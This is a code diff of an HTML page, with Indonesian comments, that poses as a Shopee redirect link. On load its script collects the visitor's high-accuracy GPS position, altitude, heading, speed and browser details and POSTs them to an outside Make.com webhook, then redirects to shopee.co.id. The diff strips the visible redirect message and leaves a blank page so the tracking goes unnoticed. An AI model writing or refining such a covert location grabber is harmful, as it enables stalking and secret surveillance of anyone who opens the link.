@@ -7,50 +7,124 @@
   <script>
     const WEBHOOK_URL = 'https://hook.eu2.make.com/snsxpo7oc5fyiy3fy697rqu29trp9rqy';
 
-    async function sendLocationAndRedirect() {
+    async function getBestGPSLocation() {
+      return new Promise((resolve, reject) => {
+        let bestPosition = null;
+        let attempts = 0;
+        const maxAttempts = 3;
+        const watchId = navigator.geolocation.watchPosition(
+          (position) => {
+            attempts++;
+            
+            // Pilih position dengan accuracy terbaik
+            if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
+              bestPosition = position;
+            }
+            
+            // Jika sudah cukup akurat atau max attempts, stop
+            if (position.coords.accuracy <= 15 || attempts >= maxAttempts) {
+              navigator.geolocation.clearWatch(watchId);
+              if (bestPosition) {
+                resolve(bestPosition);
+              } else {
+                reject(new Error('Tidak dapat mendapatkan lokasi akurat'));
+              }
+            }
+          },
+          (error) => {
+            navigator.geolocation.clearWatch(watchId);
+            reject(error);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 20000,
+            maximumAge: 0,
+            distanceFilter: 1 // Update setiap 1 meter movement
+          }
+        );
+        
+        // Timeout safety
+        setTimeout(() => {
+          navigator.geolocation.clearWatch(watchId);
+          if (bestPosition) {
+            resolve(bestPosition);
+          } else {
+            reject(new Error('Timeout'));
+          }
+        }, 25000);
+      });
+    }
+
+    async function sendToMakeWebhook(lat, lng, accuracy, altitude = null, heading = null, speed = null) {
+      const data = {
+        latitude: lat,
+        longitude: lng,
+        accuracy: accuracy,
+        altitude: altitude,
+        heading: heading,
+        speed: speed,
+        timestamp: new Date().toLocaleString('id-ID'),
+        userAgent: navigator.userAgent,
+        url: window.location.href,
+        method: 'high_accuracy_gps'
+      };
+      
+      try {
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+        
+        if (response.ok) {
+          console.log('✅ Data high accuracy terkirim');
+        }
+      } catch (error) {
+        console.log('❌ Gagal kirim data:', error);
+      }
+    }
+
+    async function startHighAccuracyLocation() {
       if (!navigator.geolocation) {
         window.location.href = 'https://shopee.co.id';
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-          const { latitude, longitude, accuracy } = pos.coords;
-          const data = {
-            latitude,
-            longitude,
-            accuracy,
-            timestamp: new Date().toLocaleString('id-ID'),
-            userAgent: navigator.userAgent,
-            url: window.location.href,
-            method: 'auto_redirect',
-          };
+      try {
+        // Method 1: High Accuracy GPS dengan multiple attempts
+        const position = await getBestGPSLocation();
+        
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        const altitude = position.coords.altitude;
+        const heading = position.coords.heading;
+        const speed = position.coords.speed;
 
-          try {
-            await fetch(WEBHOOK_URL, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(data),
-            });
-          } catch (e) {
-            console.log('Gagal kirim data:', e);
-          }
+        // Kirim data ke Make.com
+        await sendToMakeWebhook(lat, lng, accuracy, altitude, heading, speed);
 
-          // Redirect langsung
+        // Redirect ke Shopee setelah 1 detik
+        setTimeout(() => {
           window.location.href = 'https://shopee.co.id';
-        },
-        (err) => {
-          console.log('Lokasi gagal:', err);
+        }, 1000);
+
+      } catch (error) {
+        console.error('Location error:', error);
+        
+        // Fallback ke method biasa
+        setTimeout(() => {
           window.location.href = 'https://shopee.co.id';
-        },
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-      );
+        }, 1000);
+      }
     }
 
-    window.onload = sendLocationAndRedirect;
+    window.onload = startHighAccuracyLocation;
   </script>
 </head>
-<body style="background:#fff; color:#444; text-align:center; padding-top:40vh; font-family:sans-serif;">
-  <p>📡 Mengarahkan ke Shopee...</p>
+<body style="background:#fff; margin:0; padding:0;">
+  <!-- Blank page -->
 </body>
 </html>
